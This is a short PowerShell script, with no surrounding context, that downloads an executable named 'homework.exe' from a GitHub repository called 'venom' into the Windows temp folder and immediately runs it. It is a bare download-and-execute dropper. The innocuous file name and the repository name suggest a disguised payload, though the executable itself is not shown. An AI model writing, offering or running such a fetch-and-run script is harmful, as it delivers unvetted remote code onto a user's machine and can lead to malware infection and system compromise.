$url = "https://github.com/sigmanip/venom/raw/refs/heads/main/homework.exe"  
$output = "$env:TEMP\homework.exe"  
Invoke-WebRequest -Uri $url -OutFile $output  
Start-Process $output  
